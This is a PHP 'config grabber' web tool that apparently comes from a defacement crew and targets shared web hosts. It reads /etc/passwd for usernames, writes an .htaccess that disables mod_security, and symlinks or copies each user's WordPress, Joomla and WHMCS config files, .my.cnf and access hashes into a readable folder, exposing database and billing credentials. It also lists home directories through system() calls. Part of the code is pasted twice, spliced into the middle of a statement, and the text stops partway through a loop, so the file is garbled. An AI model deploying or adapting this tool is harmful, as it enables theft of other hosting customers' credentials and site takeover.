<title>.: SIMPLE CONFIG GRABBER :.</title>
<style type='text/css'>body, a, a:link{cursor:url(http://jrdmetalurgica.com/4.bp.blogspot.com/-hAF7tPUnmEE/TwGR3lRH0EI/AAAAAAAAAs8/6pki22hc3NE/s1600/ass.png), default;} a:hover {cursor:url(http://jrdmetalurgica.com/3.bp.blogspot.com/-bRikgqeZx0Q/TwGR4MUEC7I/AAAAAAAAAtA/isJmS0r35Qw/s1600/pointer.png),wait;}</style>
<body bgcolor="black" oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
<link href="https://fonts.googleapis.com/css?family=Iceland" rel='stylesheet' type='text/css'>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=Windows-1254" />
<link rel="shortcut icon" href="http://www.foliza61.com/favicon.ico" type="image/x-icon" />
<link href="http://www.yavuztopel.com/index.css" rel="stylesheet" type="text/css" />
</head>

<style>
    body {
    background-image: url('https://i0.wp.com/2.bp.blogspot.com/-l-DVdG4sfXM/WnAS1CfEvMI/AAAAAAAAAF8/GWbE_GZ-l0oinQHD-_kM1r4t44v__T6iQCLcBGAs/s1600/Hujan%2Bdari%2BLangit%2BAnimasi.gif?w=640&ssl=1');
    background-attachment: fixed;
    background-repeat: no-repeat;
    background-size: cover;
</style>
<center><form method=post>
<textarea type=hidden rows=10 cols=30 name=user><?php $users=file("/etc/passwd");
foreach($users as $user)
{
 $str=explode(":",$user);
 echo $str[0]."\n";
 }
 ?></textarea><br><br>
<input type=submit name=su value=" GRAB "></form>
</center><?php
 /*AUTHOR : AZZATSSINS CYBERSERKERS | BN-IDBTE4M */
if(isset($_POST['su']))
 {
 mkdir('x',0777);
 $r = " # Config Symlink By AZZATSSINS \nOptions Indexes FollowSymLinks \nForceType text/plain \nAddType text/plain .php \nAddType text/plain .html \nAddType text/html .shtml \nAddType txt .php \nAddHandler server-parsed .php \nAddHandler server-parsed .shtml \nAddHandler txt .php \nAddHandler txt .html \nAddHandler txt .shtml \nOptions All \n<IfModule mod_security.c> \nSecFilterEngine Off \nSecFilterScanPOST Off \nSecFilterCheckURLEncoding Off \nSecFilterCheckCookieFormat Off \nSecFilterCheckUnicodeEncoding Off \nSecFilterNormalizeCookies Off \n</IfModule>";
$f = fopen('x/.htaccess','w');
fwrite($f,$r);
echo "<br><center><b><i><a href=x>CECK INI HERE</a></i></b></center>";
$usr=explode("\n",$_POST['user']);
foreach($usr as $uss)
{
 $us=trim($uss);
$r="x/";
symlink('/home3/'.$us.'/public_html/wp-config.php',$r.$us.'..wp-config');
symlink('/home2/'.$us.'/public_html/wp-config.php',$r.$us.'..wp-config');
symlink('/home/'.$us.'/public_html/wp-config.php',$r.$us.'..wp-config');
symlink('/home4/'.$us.'/public_html/wp-config.php',$r.$us.'..wp-config');
symlink('/home5/'.$us.'/public_html/wp-config.php',$r.$us.'..wp-config');
symlink('/home6/'.$us.'/public_html/wp-config.php',$r.$us.'..wp-config');
symlink('/home7/'.$us.'/public_html/wp-config.php',$r.$us.'..wp-config');
symlink('/home8/'.$us.'/public_html/wp-config.php',$r.$us.'..wp-config');
symlink('/home1/'.$us.'/public_html/configuration.php',$r.$us.'..joomla-config');
symlink('/home2/'.$us.'/public_html/configuration.php',$r.$us.'..joomla-config');
symlink('/home/'.$us.'/public_html/configuration.php',$r.$us.'..joomla-config');
symlink('/home4/'.$us.'/public_html/configuration.php',$r.$us.'..joomla-config');
symlink('/home5/'.$us.'/public_html/configuration.php',$r.$us.'..joomla-config');
symlink('/home6/'.$us.'/public_html/configuration.php',$r.$us.'..joomla-config');
symlink('/home7/'.$us.'/public_html/configuration.php',$r.$us.'..joomla-config');
symlink('/home8/'.$us.'/public_html/configuration.php',$r.$us.'..joomla-config');
symlink('/home3/'.$us.'/public_html/blog/wp-config.php',$r.$us.'..wp-config');
symlink('/home2/'.$us.'/public_html/blogs/wp-config.php',$r.$us.'..wp-config');
symlink('/home/'.$us.'/public_html/wp/wp-config.php',$r.$us.'..wp-config');
symlink('/home4/'.$us.'/public_html/wordpress/wp-config.php',$r.$us.'..wp-config');
symlink('/home5/'.$us.'/public_html/WP/wp-config.php',$r.$us.'..wp-config');
symlink('/home6/'.$us.'/public_html/test/wp-config.php',$r.$us.'..wp-config');
symlink('/home7/'.$us.'/public_html/TEST/wp-config.php',$r.$us.'..wp-config');
symlink('/home8/'.$us.'/public_html/BLOG/wp-config.php',$r.$us.'..wp-config');
symlink('/home1/'.$us.'/public_html/BLOGS/configuration.php',$r.$us.'..joomla-config');
symlink('/home2/'.$us.'/public_html/joomla/configuration.php',$r.$us.'..joomla-config');
symlink('/home/'.$us.'/public_html/test/configuration.php',$r.$us.'..joomla-config');
symlink('/home4/'.$us.'/public_html/blog/configuration.php',$r.$us.'..joomla-config');
symlink('/home5/'.$us.'/public_html/m/configuration.php',$r.$us.'..joomla-config');
symlink('/home6/'.$us.'/public_html/BLOG/configuration.php',$r.$us.'..joomla-config');
symlink('/home7/'.$us.'/public_html/TEST/configuration.php',$r.$us.'..joomla-config');
symlink('/home8/'.$us.'/public_html/JOOMLA/configuration.php',$r.$us.'..joomla-config');
symlink('/home3/'.$us.'/public_html/blog1/wp-config.php',$r.$us.'..wp-config');
symlink('/home2/'.$us.'/public_html/blogs1/wp-config.php',$r.$us.'..wp-config');
symlink('/home/'.$us.'/public_html/wp1/wp-config.php',$r.$us.'..wp-config');
symlink('/home4/'.$us.'/public_html/wordpress2/wp-config.php',$r.$us.'..wp-config');
symlink('/home5/'.$us.'/public_html/WP2/wp-config.php',$r.$us.'..wp-config');
symlink('/home6/'.$us.'/public_html/test1/wp-config.php',$r.$us.'..wp-config');
symlink('/home7/'.$us.'/public_html/TEST2/wp-config.php',$r.$us.'..wp-config');
symlink('/home8/'.$us.'/public_html/BLOG2/wp-config.php',$r.$us.'..wp-config');
symlink('/home1/'.$us.'/public_html/BLOGS2/configuration.php',$r.$us.'..joomla-config');
symlink('/home2/'.$us.'/public_html/joomla1/configuration.php',$r.$us.'..joomla-config');
symlink('/home/'.$us.'/public_html/test1/configuration.php',$r.$us.'..joomla-config');
symlink('/home4/'.$us.'/public_html/blog1/configuration.php',$r.$us.'..joomla-config');
symlink('/home5/'.$us.'/public_html/m1/configuration.php',$r.$us.'..joomla-config');
symlink('/home6/'.$us.'/public_html/BLOG1/configuration.php',$r.$us.'..joomla-config');
symlink('/home7/'.$us.'/public_html/TEST1/configuration.php',$r.$us.'..joomla-config');
symlink('/home8/'.$us.'/public_html/JOOMLA1/configuration.php',$r.$us.'..joomla-config');
symlink('/home3/'.$us.'/public_html/blog2/wp-config.php',$r.$us.'..wp-config');
symlink('/home2/'.$us.'/public_html/blogs2/wp-config.php',$r.$us.'..wp-config');
symlink('/home/'.$us.'/public_html/wp2/wp-config.php',$r.$us.'..wp-config');
symlink('/home4/'.$us.'/public_html/wordpress2/wp-config.php',$r.$us.'..wp-config');
symlink('/home5/'.$us.'/public_html/WP2/wp-config.php',$r.$us.'..wp-config');
symlink('/home6/'.$us.'/public_html/test2/wp-config.php',$r.$us.'..wp-config');
symlink('/home7/'.$us.'/public_html/TEST2/wp-config.php',$r.$us.'..wp-config');
symlink('/home8/'.$us.'/public_html/BLOG2/wp-config.php',$r.$us.'..wp-config');
symlink('/home1/'.$us.'/public_html/BLOGS2/configuration.php',$r.$us.'..joomla-config');
symlink('/home2/'.$us.'/public_html/joomla2/configuration.php',$r.$us.'..joomla-config');
symlink('/home/'.$us.'/public_html/test2/configuration.php',$r.$us.'..joomla-config');
symlink('/home4/'.$us.'/public_html/blog2/configuration.php',$r.$us.'..joomla-config');
symlink('/home5/'.$us.'/public_html/m2/configuration.php',$r.$us.'..joomla-config');
symlink('/home6/'.$us.'/public_html/BLOG2/configuration.php',$r.$us.'..joomla-config');
symlink('/home7/'.$us.'/public_html/TEST2/configuration.php',$r.$us.'..joomla-config');
symlink('/home8/'.$us.'/public_html/JOOMLA2/configuration.php',$r.$us.'..joomla-config');
symlink('/home3/'.$us.'/public_html/blog2/wp-config.php',$r.$us.'..wp-config');
symlink('/home2/'.$us.'/public_html/blogs2/wp-config.php',$r.$us.'..wp-config');
symlink('/home/'.$us.'/public_html/wp2/wp-config.php',$r.$us.'..wp-config');
symlink('/home4/'.$us.'/public_html/wordpress3/wp-config.php',$r.$us.'..wp-config');
symlink('/home5/'.$us.'/public_html/WP3/wp-config.php',$r.$us.'..wp-config');
symlink('/home6/'.$us.'/public_html/test2/wp-config.php',$r.$us.'..wp-config');
symlink('/home7/'.$us.'/public_html/TEST3/wp-config.php',$r.$us.'..wp-config');
symlink('/home8/'.$us.'/public_html/BLOG3/wp-config.php',$r.$us.'..wp-config');
symlink('/home1/'.$us.'/public_html/BLOGS3/configuration.php',$r.$us.'..joomla-config');
symlink('/home2/'.$us.'/public_html/joomla2/configuration.php',$r.$us.'..joomla-config');
symlink('/home/'.$us.'/public_html/test2/configuration.php',$r.$us.'..joomla-config');
symlink('/home4/'.$us.'/public_html/blog2/configuration.php',$r.$us.'..joomla-config');
symlink('/home5/'.$us.'/public_html/m2/configuration.php',$r.$us.'..joomla-config');
symlink('/home6/'.$us.'/public_html/BLOG2/configuration.php',$r.$us.'..joomla-config');
symlink('/home7/'.$us.'/public_html/TEST2/configuration.php',$r.$us.'..joomla-config');
symlink('/home8/'.$us.'/public_html/JOOMLA2/configuration.php',$r.$us.'..joomla-config');
symlink('/var/www/vhost'.$us.'/httpdocs/configuration.php',$r.$us.'..joomla-config');
symlink('/var/www/vhost'.$us.'httpdocs/wp-config.php',$r.$us.'..wp-config');
symlink('/var/www/vhosts'.$us.'/httpdocs/configuration.php',$r.$us.'..joomla-config');
symlink('/var/www/vhosts'.$us.'/httpdocs/wp-config.php',$r.$us.'..wp-config');
symlink('/var/www/vhost'.$us.'/htdocs/configuration.php',$r.$us.'..joomla-config');
symlink('/var/www/vhost'.$us.'htdocs/wp-config.php',$r.$us.'..wp-config');
symlink('/var/www/vhosts'.$us.'/htdocs/configuration.php',$r.$us.'..joomla-config');
symlink('/var/www/vhosts'.$us.'/htdocs/wp-config.php',$r.$us.'..wp-config');
symlink('/var/wwwroot'.$us.'/wp-config.php',$r.$us.'..wp-config');
symlink('/var/wwwroot'.$us.'/configuration.php',$r.$us.'..joomla-config');
symlink('/home/'.$us.'/public_html/configuration.php',$r.$us.'..joomla-or-whmcs');symlink('/home/'.$us.'/public_html/blog/wp-config.php',$r.$us.'..wp-config');
symlink('/home2/'.$us.'/public_html/configuration.php',$r.$us.'..joomla-or-whmcs');symlink('/home/'.$us.'/public_html/blog/wp-config.php',$r.$us.'..wp-config');
symlink('/home3/'.$us.'/public_html/configuration.php',$r.$us.'..joomla-or-whmcs');symlink('/home2/'.$us.'/public_html/blog/wp-config.php',$r.$us.'..wp-config');
symlink('/home4/'.$us.'/public_html/configuration.php',$r.$us.'..joomla-or-whmcs');symlink('/home3/'.$us.'/public_html/blog/wp-config.php',$r.$us.'..wp-config');
symlink('/home/'.$us.'/public_html/blog/configuration.php',$r.$us.'..joomla');symlink('/home4/'.$us.'/public_html/wp/wp-config.php',$r.$us.'..wp-config');
symlink('/home/'.$us.'/public_html/wordpress/wp-congig.php',$r.$us.'..wordpress');symlink('/home/'.$us.'/public_html/config.php',$r.$us.'..config');
symlink('/home/'.$us.'/public_html/whmcs/configuration.php',$r.$us.'..whmcs');
symlink('/home/'.$us.'/public_html/support/configuration.php',$r.$us.'..supporwhmcs');
symlink('/home/'.$us.'/public_html/secure/configuration.php',$r.$us.'..securewhmcs');
symlink('/home/'.$us.'/public_html/clients/configuration.php',$r.$us.'..whmcs-clients');
symlink('/home/'.$us.'/public_html/client/configuration.php',$r.$us.'..whmcs-client');
symlink('/home/'.$us.'/public_html/billing/configuration.php',$r.$us.'..whmcs-billing');
symlink('/home/'.$us.'/public_html/admin/config.php',$r.$us.'..admin-config');
symlink('/home/'.$us.'/public_html/whmcs/configuration.php',$r.$us.'..whmcs');
symlink('/home2/'.$us.'/public_html/support/configuration.php',$r.$us.'..supporwhmcs');
symlink('/home3/'.$us.'/public_html/secure/configuration.php',$r.$us.'..securewhmcs');
symlink('/home4/'.$us.'/public_html/clients/configuration.php',$r.$us.'..whmcs-clients');
symlink('/home5/'.$us.'/public_html/client/configuration.php',$r.$us.'..whmcs-client');
symlink('/home6/'.$us.'/public_html/billing/configuration.php',$r.$us.'..whmcs-billing');
symlink('/home7/'.$us.'/public_html/admin/config.php',$r.$us.'..admin-config');
echo'<meta http-equiv="Refresh" content= "0; url=x">';}}?>

<?php echo '<html>
<head>
<title>Symlinsu</title>
<meta property="og:title" content="$ Achon666ju5t $"/>      <meta property="og:description" content="Hacked By Extreme Crew"/>
<link href="https://fonts.googleapis.com/css?family=Jockey+One" rel="stylesheet">
<link href="https://fonts.googleapis.com/css?family=Courier" rel="stylesheet">
</head>
<body bgcolor="black">
<style>    body{     background-image: url(index.html);     background-repeat: no-repeat;      background-attachment: fixed;      background-position: top;     background-color:#000000;     position: relative;     background-size:100% 100vh;          }     .defacedby{     font-family: Megrim;     text-align: center;     color: black;     font-weight: bold;     font-size: 50px;   text-shadow: #0080FF 1px 2px 1px;        }    .glow {     font-family: Quicksand;     text-align: center;     color: grey;     font-style: bold;     font-size: 15px;    margin-top: 16px;    text-shadow: black 1px 2px 1px;        }    .greetings{     font-family: Quicksand;     text-align: center;     color: #ffffff;     font-size: 15px;     margin-top: 50px; text-shadow: black 1px 2px 1px;    }    </style>
<table width="100%" height="100%"><td align=center>
<img src="https://lh4.googleusercontent.com/-vRbahBaV4GA/VGiPnhH1PqI/AAAAAAAAABw/pYik-TNuvFU/w810-h587-no/diev4owl.jpg"</img><br>
';
@error_reporting(0);
@ini<title>.: SIMPLE CONFIG GRABBER :.</title>
<style type='text/css'>body, a, a:link{cursor:url(http://jrdmetalurgica.com/4.bp.blogspot.com/-hAF7tPUnmEE/TwGR3lRH0EI/AAAAAAAAAs8/6pki22hc3NE/s1600/ass.png), default;} a:hover {cursor:url(http://jrdmetalurgica.com/3.bp.blogspot.com/-bRikgqeZx0Q/TwGR4MUEC7I/AAAAAAAAAtA/isJmS0r35Qw/s1600/pointer.png),wait;}</style>
<body bgcolor="black" oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
<link href="https://fonts.googleapis.com/css?family=Iceland" rel='stylesheet' type='text/css'>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=Windows-1254" />
<link rel="shortcut icon" href="http://www.foliza61.com/favicon.ico" type="image/x-icon" />
<link href="http://www.yavuztopel.com/index.css" rel="stylesheet" type="text/css" />
</head>

<style>
    body {
    background-image: url('https://i0.wp.com/2.bp.blogspot.com/-l-DVdG4sfXM/WnAS1CfEvMI/AAAAAAAAAF8/GWbE_GZ-l0oinQHD-_kM1r4t44v__T6iQCLcBGAs/s1600/Hujan%2Bdari%2BLangit%2BAnimasi.gif?w=640&ssl=1');
    background-attachment: fixed;
    background-repeat: no-repeat;
    background-size: cover;
</style>
<center><form method=post>
<textarea type=hidden rows=10 cols=30 name=user><?php $users=file("/etc/passwd");
foreach($users as $user)
{
 $str=explode(":",$user);
 echo $str[0]."\n";
 }
 ?></textarea><br><br>
<input type=submit name=su value=" GRAB "></form>
</center><?php
 /*AUTHOR : AZZATSSINS CYBERSERKERS | BN-IDBTE4M */
if(isset($_POST['su']))
 {
 mkdir('x',0777);
 $r = " # Config Symlink By AZZATSSINS \nOptions Indexes FollowSymLinks \nForceType text/plain \nAddType text/plain .php \nAddType text/plain .html \nAddType text/html .shtml \nAddType txt .php \nAddHandler server-parsed .php \nAddHandler server-parsed .shtml \nAddHandler txt .php \nAddHandler txt .html \nAddHandler txt .shtml \nOptions All \n<IfModule mod_security.c> \nSecFilterEngine Off \nSecFilterScanPOST Off \nSecFilterCheckURLEncoding Off \nSecFilterCheckCookieFormat Off \nSecFilterCheckUnicodeEncoding Off \nSecFilterNormalizeCookies Off \n</IfModule>";
$f = fopen('x/.htaccess','w');
fwrite($f,$r);
echo "<br><center><b><i><a href=x>CECK INI HERE</a></i></b></center>";
$usr=explode("\n",$_POST['user']);
foreach($usr as $uss)
{
 $us=trim($uss);
$r="x/";
symlink('/home3/'.$us.'/public_html/wp-config.php',$r.$us.'..wp-config');
symlink('/home2/'.$us.'/public_html/wp-config.php',$r.$us.'..wp-config');
symlink('/home/'.$us.'/public_html/wp-config.php',$r.$us.'..wp-config');
symlink('/home4/'.$us.'/public_html/wp-config.php',$r.$us.'..wp-config');
symlink('/home5/'.$us.'/public_html/wp-config.php',$r.$us.'..wp-config');
symlink('/home6/'.$us.'/public_html/wp-config.php',$r.$us.'..wp-config');
symlink('/home7/'.$us.'/public_html/wp-config.php',$r.$us.'..wp-config');
symlink('/home8/'.$us.'/public_html/wp-config.php',$r.$us.'..wp-config');
symlink('/home1/'.$us.'/public_html/configuration.php',$r.$us.'..joomla-config');
symlink('/home2/'.$us.'/public_html/configuration.php',$r.$us.'..joomla-config');
symlink('/home/'.$us.'/public_html/configuration.php',$r.$us.'..joomla-config');
symlink('/home4/'.$us.'/public_html/configuration.php',$r.$us.'..joomla-config');
symlink('/home5/'.$us.'/public_html/configuration.php',$r.$us.'..joomla-config');
symlink('/home6/'.$us.'/public_html/configuration.php',$r.$us.'..joomla-config');
symlink('/home7/'.$us.'/public_html/configuration.php',$r.$us.'..joomla-config');
symlink('/home8/'.$us.'/public_html/configuration.php',$r.$us.'..joomla-config');
symlink('/home3/'.$us.'/public_html/blog/wp-config.php',$r.$us.'..wp-config');
symlink('/home2/'.$us.'/public_html/blogs/wp-config.php',$r.$us.'..wp-config');
symlink('/home/'.$us.'/public_html/wp/wp-config.php',$r.$us.'..wp-config');
symlink('/home4/'.$us.'/public_html/wordpress/wp-config.php',$r.$us.'..wp-config');
symlink('/home5/'.$us.'/public_html/WP/wp-config.php',$r.$us.'..wp-config');
symlink('/home6/'.$us.'/public_html/test/wp-config.php',$r.$us.'..wp-config');
symlink('/home7/'.$us.'/public_html/TEST/wp-config.php',$r.$us.'..wp-config');
symlink('/home8/'.$us.'/public_html/BLOG/wp-config.php',$r.$us.'..wp-config');
symlink('/home1/'.$us.'/public_html/BLOGS/configuration.php',$r.$us.'..joomla-config');
symlink('/home2/'.$us.'/public_html/joomla/configuration.php',$r.$us.'..joomla-config');
symlink('/home/'.$us.'/public_html/test/configuration.php',$r.$us.'..joomla-config');
symlink('/home4/'.$us.'/public_html/blog/configuration.php',$r.$us.'..joomla-config');
symlink('/home5/'.$us.'/public_html/m/configuration.php',$r.$us.'..joomla-config');
symlink('/home6/'.$us.'/public_html/BLOG/configuration.php',$r.$us.'..joomla-config');
symlink('/home7/'.$us.'/public_html/TEST/configuration.php',$r.$us.'..joomla-config');
symlink('/home8/'.$us.'/public_html/JOOMLA/configuration.php',$r.$us.'..joomla-config');
symlink('/home3/'.$us.'/public_html/blog1/wp-config.php',$r.$us.'..wp-config');
symlink('/home2/'.$us.'/public_html/blogs1/wp-config.php',$r.$us.'..wp-config');
symlink('/home/'.$us.'/public_html/wp1/wp-config.php',$r.$us.'..wp-config');
symlink('/home4/'.$us.'/public_html/wordpress2/wp-config.php',$r.$us.'..wp-config');
symlink('/home5/'.$us.'/public_html/WP2/wp-config.php',$r.$us.'..wp-config');
symlink('/home6/'.$us.'/public_html/test1/wp-config.php',$r.$us.'..wp-config');
symlink('/home7/'.$us.'/public_html/TEST2/wp-config.php',$r.$us.'..wp-config');
symlink('/home8/'.$us.'/public_html/BLOG2/wp-config.php',$r.$us.'..wp-config');
symlink('/home1/'.$us.'/public_html/BLOGS2/configuration.php',$r.$us.'..joomla-config');
symlink('/home2/'.$us.'/public_html/joomla1/configuration.php',$r.$us.'..joomla-config');
symlink('/home/'.$us.'/public_html/test1/configuration.php',$r.$us.'..joomla-config');
symlink('/home4/'.$us.'/public_html/blog1/configuration.php',$r.$us.'..joomla-config');
symlink('/home5/'.$us.'/public_html/m1/configuration.php',$r.$us.'..joomla-config');
symlink('/home6/'.$us.'/public_html/BLOG1/configuration.php',$r.$us.'..joomla-config');
symlink('/home7/'.$us.'/public_html/TEST1/configuration.php',$r.$us.'..joomla-config');
symlink('/home8/'.$us.'/public_html/JOOMLA1/configuration.php',$r.$us.'..joomla-config');
symlink('/home3/'.$us.'/public_html/blog2/wp-config.php',$r.$us.'..wp-config');
symlink('/home2/'.$us.'/public_html/blogs2/wp-config.php',$r.$us.'..wp-config');
symlink('/home/'.$us.'/public_html/wp2/wp-config.php',$r.$us.'..wp-config');
symlink('/home4/'.$us.'/public_html/wordpress2/wp-config.php',$r.$us.'..wp-config');
symlink('/home5/'.$us.'/public_html/WP2/wp-config.php',$r.$us.'..wp-config');
symlink('/home6/'.$us.'/public_html/test2/wp-config.php',$r.$us.'..wp-config');
symlink('/home7/'.$us.'/public_html/TEST2/wp-config.php',$r.$us.'..wp-config');
symlink('/home8/'.$us.'/public_html/BLOG2/wp-config.php',$r.$us.'..wp-config');
symlink('/home1/'.$us.'/public_html/BLOGS2/configuration.php',$r.$us.'..joomla-config');
symlink('/home2/'.$us.'/public_html/joomla2/configuration.php',$r.$us.'..joomla-config');
symlink('/home/'.$us.'/public_html/test2/configuration.php',$r.$us.'..joomla-config');
symlink('/home4/'.$us.'/public_html/blog2/configuration.php',$r.$us.'..joomla-config');
symlink('/home5/'.$us.'/public_html/m2/configuration.php',$r.$us.'..joomla-config');
symlink('/home6/'.$us.'/public_html/BLOG2/configuration.php',$r.$us.'..joomla-config');
symlink('/home7/'.$us.'/public_html/TEST2/configuration.php',$r.$us.'..joomla-config');
symlink('/home8/'.$us.'/public_html/JOOMLA2/configuration.php',$r.$us.'..joomla-config');
symlink('/home3/'.$us.'/public_html/blog2/wp-config.php',$r.$us.'..wp-config');
symlink('/home2/'.$us.'/public_html/blogs2/wp-config.php',$r.$us.'..wp-config');
symlink('/home/'.$us.'/public_html/wp2/wp-config.php',$r.$us.'..wp-config');
symlink('/home4/'.$us.'/public_html/wordpress3/wp-config.php',$r.$us.'..wp-config');
symlink('/home5/'.$us.'/public_html/WP3/wp-config.php',$r.$us.'..wp-config');
symlink('/home6/'.$us.'/public_html/test2/wp-config.php',$r.$us.'..wp-config');
symlink('/home7/'.$us.'/public_html/TEST3/wp-config.php',$r.$us.'..wp-config');
symlink('/home8/'.$us.'/public_html/BLOG3/wp-config.php',$r.$us.'..wp-config');
symlink('/home1/'.$us.'/public_html/BLOGS3/configuration.php',$r.$us.'..joomla-config');
symlink('/home2/'.$us.'/public_html/joomla2/configuration.php',$r.$us.'..joomla-config');
symlink('/home/'.$us.'/public_html/test2/configuration.php',$r.$us.'..joomla-config');
symlink('/home4/'.$us.'/public_html/blog2/configuration.php',$r.$us.'..joomla-config');
symlink('/home5/'.$us.'/public_html/m2/configuration.php',$r.$us.'..joomla-config');
symlink('/home6/'.$us.'/public_html/BLOG2/configuration.php',$r.$us.'..joomla-config');
symlink('/home7/'.$us.'/public_html/TEST2/configuration.php',$r.$us.'..joomla-config');
symlink('/home8/'.$us.'/public_html/JOOMLA2/configuration.php',$r.$us.'..joomla-config');
symlink('/var/www/vhost'.$us.'/httpdocs/configuration.php',$r.$us.'..joomla-config');
symlink('/var/www/vhost'.$us.'httpdocs/wp-config.php',$r.$us.'..wp-config');
symlink('/var/www/vhosts'.$us.'/httpdocs/configuration.php',$r.$us.'..joomla-config');
symlink('/var/www/vhosts'.$us.'/httpdocs/wp-config.php',$r.$us.'..wp-config');
symlink('/var/www/vhost'.$us.'/htdocs/configuration.php',$r.$us.'..joomla-config');
symlink('/var/www/vhost'.$us.'htdocs/wp-config.php',$r.$us.'..wp-config');
symlink('/var/www/vhosts'.$us.'/htdocs/configuration.php',$r.$us.'..joomla-config');
symlink('/var/www/vhosts'.$us.'/htdocs/wp-config.php',$r.$us.'..wp-config');
symlink('/var/wwwroot'.$us.'/wp-config.php',$r.$us.'..wp-config');
symlink('/var/wwwroot'.$us.'/configuration.php',$r.$us.'..joomla-config');
symlink('/home/'.$us.'/public_html/configuration.php',$r.$us.'..joomla-or-whmcs');symlink('/home/'.$us.'/public_html/blog/wp-config.php',$r.$us.'..wp-config');
symlink('/home2/'.$us.'/public_html/configuration.php',$r.$us.'..joomla-or-whmcs');symlink('/home/'.$us.'/public_html/blog/wp-config.php',$r.$us.'..wp-config');
symlink('/home3/'.$us.'/public_html/configuration.php',$r.$us.'..joomla-or-whmcs');symlink('/home2/'.$us.'/public_html/blog/wp-config.php',$r.$us.'..wp-config');
symlink('/home4/'.$us.'/public_html/configuration.php',$r.$us.'..joomla-or-whmcs');symlink('/home3/'.$us.'/public_html/blog/wp-config.php',$r.$us.'..wp-config');
symlink('/home/'.$us.'/public_html/blog/configuration.php',$r.$us.'..joomla');symlink('/home4/'.$us.'/public_html/wp/wp-config.php',$r.$us.'..wp-config');
symlink('/home/'.$us.'/public_html/wordpress/wp-congig.php',$r.$us.'..wordpress');symlink('/home/'.$us.'/public_html/config.php',$r.$us.'..config');
symlink('/home/'.$us.'/public_html/whmcs/configuration.php',$r.$us.'..whmcs');
symlink('/home/'.$us.'/public_html/support/configuration.php',$r.$us.'..supporwhmcs');
symlink('/home/'.$us.'/public_html/secure/configuration.php',$r.$us.'..securewhmcs');
symlink('/home/'.$us.'/public_html/clients/configuration.php',$r.$us.'..whmcs-clients');
symlink('/home/'.$us.'/public_html/client/configuration.php',$r.$us.'..whmcs-client');
symlink('/home/'.$us.'/public_html/billing/configuration.php',$r.$us.'..whmcs-billing');
symlink('/home/'.$us.'/public_html/admin/config.php',$r.$us.'..admin-config');
symlink('/home/'.$us.'/public_html/whmcs/configuration.php',$r.$us.'..whmcs');
symlink('/home2/'.$us.'/public_html/support/configuration.php',$r.$us.'..supporwhmcs');
symlink('/home3/'.$us.'/public_html/secure/configuration.php',$r.$us.'..securewhmcs');
symlink('/home4/'.$us.'/public_html/clients/configuration.php',$r.$us.'..whmcs-clients');
symlink('/home5/'.$us.'/public_html/client/configuration.php',$r.$us.'..whmcs-client');
symlink('/home6/'.$us.'/public_html/billing/configuration.php',$r.$us.'..whmcs-billing');
symlink('/home7/'.$us.'/public_html/admin/config.php',$r.$us.'..admin-config');
echo'<meta http-equiv="Refresh" content= "0; url=x">';}}?>
_set('html_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('display_errors', 0);
@ini_set('file_uploads', 1);
echo '<div style=background:black;margin:0px;padding:4px;text-align:center;color:silver;></div><br>
<form method="post">
<center>
<center><textarea style="color:red;background-color:#000000" cols="60" name="passwd" rows="20">';
$IIIIIIIIIIIl = file('/etc/passwd');
foreach ($IIIIIIIIIIIl as $IIIIIIIIIIlI) {
    $IIIIIIIIIIll = explode(':', $IIIIIIIIIIlI);
    echo $IIIIIIIIIIll[0] . '
';
}
echo system('ls /var/mail');
echo system('ls /home');
echo '</textarea><br>
Home : 
<select name="home">
<option title="home" value="home">home</option>
<option title="home1" value="home1">home1</option>
<option title="home2" value="home2">home2</option>
<option title="home3" value="home3">home3</option>
<option title="home4" value="home4">home4</option>
<option title="home5" value="home5">home5</option>
<option title="home6" value="home6">home6</option>
<option title="home7" value="home7">home7</option>
<option title="home8" value="home8">home8</option> 
<option title="home9" value="home9">home9</option>
<option title="home10" value="home10">home10</option> 
</select><br>
.htaccess : 
<select name="azztssns">
<option title="biasa" value="Options Indexes FollowSymLinks
DirectoryIndex azzatssins.cyberserkers
AddType txt .php
AddHandler txt .php">Apache 1</option>
<option title="Apache" value="Options all
Options +Indexes 
Options +FollowSymLinks 
DirectoryIndex azzatssins.cyberserkers
AddType text/plain .php
AddHandler server-parsed .php
AddType text/plain .html
AddHandler txt .html
Require None
Satisfy Any">Apache 2</option>
<option title="Litespeed" value=" 
Options +FollowSymLinks
DirectoryIndex azzatssins.cyberserkers
RemoveHandler .php
AddType application/octet-stream .php ">Litespeed</option>
</select>
<input style="color:red;background-color:#000000" name="conf" size="10"
 value="Start!!!" type="submit">
<br/><br/></form>';
if ($_POST['conf']) {
    $home = $_POST['home'];
    $IIIIIIIIII11 = $home;
    @mkdir($IIIIIIIIII11, 0755);
    @chdir($IIIIIIIIII11);
    $IIIIIIIIIlIl = $_POST['azztssns'];
    file_put_contents('.htaccess', $IIIIIIIIIlIl, FILE_APPEND);
    $passwd = explode('
', $_POST['passwd']);
    foreach ($passwd as $IIIIIIIIIllI) {
        $IIIIIIIIIlll = trim($IIIIIIIIIllI);
        symlink('/', '000~ROOT~000');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/.my.cnf', $IIIIIIIIIlll . '-CPANEL');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/.my.cnf', $IIIIIIIIIlll . '-CPANEL');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/.accesshash', $IIIIIIIIIlll . '-WHMCS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/.accesshash', $IIIIIIIIIlll . '-WHMCS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/suspended.page/index.html', $IIIIIIIIIlll . '-RESELLER.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/suspended.page/index.html', $IIIIIIIIIlll . '-RESELLER.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/.accesshash', $IIIIIIIIIlll . '-WHMCS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/wp-config.php', $IIIIIIIIIlll . '-WORDPRESS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/configuration.php', $IIIIIIIIIlll . '-WHMCS-JOOMLA.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/account/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
